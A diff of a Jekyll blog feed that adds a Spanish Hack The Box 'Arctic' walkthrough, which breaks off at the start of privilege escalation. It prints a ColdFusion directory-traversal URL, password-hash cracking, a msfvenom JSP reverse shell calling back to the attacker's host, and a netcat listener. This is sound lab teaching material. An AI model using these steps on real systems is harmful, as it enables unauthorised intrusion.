@@ -1,4 +1,269 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-08T00:30:52-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Beep</title><link href="http://localhost:4000/htb-beep/" rel="alternate" type="text/html" title="Hack The Box Beep" /><published>2021-09-07T00:00:00-05:00</published><updated>2021-09-07T00:00:00-05:00</updated><id>http://localhost:4000/htb-beep</id><content type="html" xml:base="http://localhost:4000/htb-beep/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-beep/banner-beep.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-16T02:09:37-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Arctic</title><link href="http://localhost:4000/htb-arctic/" rel="alternate" type="text/html" title="Hack The Box Arctic" /><published>2021-09-15T00:00:00-05:00</published><updated>2021-09-15T00:00:00-05:00</updated><id>http://localhost:4000/htb-arctic</id><content type="html" xml:base="http://localhost:4000/htb-arctic/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-arctic/banner-arctic.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;arctic&quot;&gt;Arctic&lt;/h1&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.11.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.11
+PING 10.10.10.11 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.11: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;145 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.11 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 144.797/144.797/144.797/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.11 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-07 21:10 CDT
+Initiating SYN Stealth Scan at 21:10
+Scanning 10.10.10.11 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 135/tcp on 10.10.10.11
+Discovered open port 49154/tcp on 10.10.10.11
+Discovered open port 8500/tcp on 10.10.10.11
+Completed SYN Stealth Scan at 21:10, 26.58s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.11
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-09-07 21:10:25 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65532 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT      STATE SERVICE REASON
+135/tcp   open  msrpc   syn-ack ttl 127
+8500/tcp  open  fmtp    syn-ack ttl 127
+49154/tcp open  unknown syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.73 seconds
+           Raw packets sent: 131085 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;880B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.11
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 135,8500,49154
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p135&lt;/span&gt;,8500,49154 10.10.10.11 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-07 21:12 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.11
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;138.84 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Obsevamos el puerto 8500/TCP abierto asociado al servicio &lt;em&gt;fmtp (Flight Message Transfer Protocol)&lt;/em&gt; y es posible que observemos cierto contenido a través del sitio web; por lo que tratamos de ingresar a la URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.11:8500/&lt;/code&gt; y observamos dos recursos de un listado de directorios:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-arctic/arctic_web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Explorando un poco los recursos vistos en el sitio web, observamos que en la siguiente dirección existe un panel de login asociado a la tecnología &lt;strong&gt;Adobe Coldfusion 8&lt;/strong&gt;. Podriamos probar credenciales de acceso como: &lt;em&gt;admin:admin&lt;/em&gt; o &lt;em&gt;admin:password&lt;/em&gt;; sin embargo, no obtenemos acceso al portal, por lo que procedemos a buscar una posible vulnerabilidad asociada a dicha tecnología:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-arctic/arctic_panel.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Buscando la existencia de algún exploit público, podemos encontrar multiples resultados con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;; por lo que le echamos un ojos poco a poco. Podemos empezar aquellos relacionados a &lt;em&gt;directory traversal - multiple/remote/14641.py&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit adobe coldfusion 8
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                   |  Path
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Adobe ColdFusion - &lt;span class=&quot;s1&quot;&gt;'probe.cfm'&lt;/span&gt; Cross-Site Scripting                                              | cfm/webapps/36067.txt
+Adobe ColdFusion - Directory Traversal                                                           | multiple/remote/14641.py
+Adobe ColdFusion - Directory Traversal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                              | multiple/remote/16985.rb
+Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution      | windows/remote/43993.py
+Adobe ColdFusion 2018 - Arbitrary File Upload                                                    | multiple/webapps/45979.txt
+Adobe ColdFusion 9 - Administrative Authentication Bypass                                        | windows/webapps/27755.txt
+Adobe ColdFusion &amp;lt; 11 Update 10 - XML External Entity Injection                                  | multiple/webapps/40346.py
+Adobe ColdFusion Server 8.0.1 - &lt;span class=&quot;s1&quot;&gt;'/administrator/enter.cfm'&lt;/span&gt; Query String Cross-Site Scripting     | cfm/webapps/33170.txt
+Adobe ColdFusion Server 8.0.1 - &lt;span class=&quot;s1&quot;&gt;'/wizards/common/_authenticatewizarduser.cfm'&lt;/span&gt; Query String Cross | cfm/webapps/33167.txt
+Adobe ColdFusion Server 8.0.1 - &lt;span class=&quot;s1&quot;&gt;'/wizards/common/_logintowizard.cfm'&lt;/span&gt; Query String Cross-Site Scr | cfm/webapps/33169.txt
+Adobe ColdFusion Server 8.0.1 - &lt;span class=&quot;s1&quot;&gt;'administrator/logviewer/searchlog.cfm?startRow'&lt;/span&gt; Cross-Site Scri | cfm/webapps/33168.txt
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el exploit, existe la posiblidad de acceso a la siguiente ruta: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en&lt;/code&gt;; ingresando, nos encontramos el panel de administración y el hash de la contraseña. Podriamos trata de identificar que tipo de hash se trata mediante el uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash-identifier&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-arctic/arctic_pass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ hash-identifier &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#########################################################################&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#     __  __                     __           ______    _____           #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#                                                             By Zion3R #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#                                                    www.Blackploit.com #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#                                                   Root@Blackploit.com #&lt;/span&gt;
+   &lt;span class=&quot;c&quot;&gt;#########################################################################&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------&lt;/span&gt;
+                                
+ Not Found.          
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------&lt;/span&gt;
+ HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+                                                                 
+Possible Hashs:            
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] SHA-1                                                        
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MySQL5 - SHA-1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SHA-1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observamos que se trata de &lt;em&gt;SHA-1&lt;/em&gt;, ahora podemos crackear el hash para obtener la contraseña en texto claro; podríamos realizarlo mediante diversas formas, en este caso lo haremos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; y mediante el sitio web &lt;a href=&quot;https://crackstation.net/&quot;&gt;Crackstation&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash
+&lt;/span&gt;Warning: detected &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Raw-SHA1&quot;&lt;/span&gt;, but the string is also recognized as &lt;span class=&quot;s2&quot;&gt;&quot;Raw-SHA1-AxCrypt&quot;&lt;/span&gt;
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--format=Raw-SHA1-AxCrypt&quot;&lt;/span&gt; option to force loading these as that &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;instead
+Warning: detected &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Raw-SHA1&quot;&lt;/span&gt;, but the string is also recognized as &lt;span class=&quot;s2&quot;&gt;&quot;Raw-SHA1-Linkedin&quot;&lt;/span&gt;
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--format=Raw-SHA1-Linkedin&quot;&lt;/span&gt; option to force loading these as that &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;instead
+Warning: detected &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Raw-SHA1&quot;&lt;/span&gt;, but the string is also recognized as &lt;span class=&quot;s2&quot;&gt;&quot;ripemd-160&quot;&lt;/span&gt;
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--format=ripemd-160&quot;&lt;/span&gt; option to force loading these as that &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;instead
+Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Raw-SHA1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA1 128/128 SSE2 4x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Warning: no OpenMP support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt;, consider &lt;span class=&quot;nt&quot;&gt;--fork&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+happyday         &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-09-07 21:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 14.28g/s 73085p/s 73085c/s 73085C/s jodie..gabita
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show --format=Raw-SHA1&quot;&lt;/span&gt; options to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-arctic/arctic_crack.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora ingresamos al panel de administración de &lt;em&gt;Adobe Coldfusion&lt;/em&gt; con el password identificado. Investigando un poco, podemos encontrar que existe una vulnerabilidad de dicha tecnología asociada al CVE &lt;em&gt;&lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2018-15961/&quot; title=&quot;CVE-2018-15961 security vulnerability details&quot;&gt;CVE-2018-15961&lt;/a&gt;&lt;/em&gt; que podemos explotar subiendo un archivo en &lt;strong&gt;java&lt;/strong&gt; en la sección de &lt;em&gt;DEBUGGING &amp;amp; LOGGING → Scheduled Tasks&lt;/em&gt; y llenamos los siguientes campos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Task Name: k4mishell&lt;/li&gt;
+  &lt;li&gt;URL: http://̣̣&lt;ip_atacante&gt;/k4mishell.jsp (también podría ser un archivo de extensión *cfm*)&lt;/ip_atacante&gt;&lt;/li&gt;
+  &lt;li&gt;Publish: check&lt;/li&gt;
+  &lt;li&gt;File: C:\coldfusion8\wwwroot\CFIDE\k4mishell.jsp (Se intuye que la aplicación se encuentra montada en la ruta &lt;em&gt;C:\coldfusion8\wwwroot\&lt;/em&gt;, por lo que incluimos el directorio &lt;em&gt;CFIDE&lt;/em&gt; y el nombre de nuestro archivo)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-arctic/arctic_shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo tanto, necesitamos generar nuestro archivo que nos entable la reverse shell, así como compartir un servidor HTTP con python.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.13 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; k4mishell.jsp
+Payload size: 1496 bytes
+Saved as: k4mishell.jsp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cuando se sube el archivo, ejecutamos la tarea para descargar el archivo desde nuestra máquina a la máquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.11 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;07/Sep/2021 22:36:44] &lt;span class=&quot;s2&quot;&gt;&quot;GET /k4mishell.jsp HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos dirigimos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.11:8500/CFIDE/&lt;/code&gt; y observamos nuestro archivo. Ahora nos ponemos en escucha por el puerto 443 y ejecutamos nuestra reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.13] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.11] 49649
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7600]
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;arctic&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;olis
+
+C:&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;oldFusion8&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;untime&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya estamos dentro de la máquina como el usuario &lt;em&gt;tolis&lt;/em&gt; y podemos visualizar la flag &lt;em&gt;user.txt&lt;/em&gt;. Ahora lo que falta es encontrar una manera de escalar privilegios en el sistema, por lo que procedemos a enumerar:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
+
+PRIVILEGES INFORMATION
+&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
+
+Privilege Name                Description                               State   
+&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set            &lt;/span&gt;Disabled
+
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;olis&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observamos que se tiene habilitado el privilegio &lt;em&gt;SeImpersonatePrivilege&lt;/em&gt;, por lo que podemos utilizar la herramienta &lt;em&gt;Juicy Potato&lt;/em&gt;; por lo que descargarmos el ejecutable de algún recurso público &lt;a href=&quot;https://github.com/ohpe/juicy-potato/releases/tag/v0.1&quot;&gt;Github&lt;/a&gt;, nos compartimos un servidor con python y lo transferimos a la máquina víctima; así como también el archivo &lt;em&gt;nc.exe&lt;/em&gt;&lt;/p&gt;
+
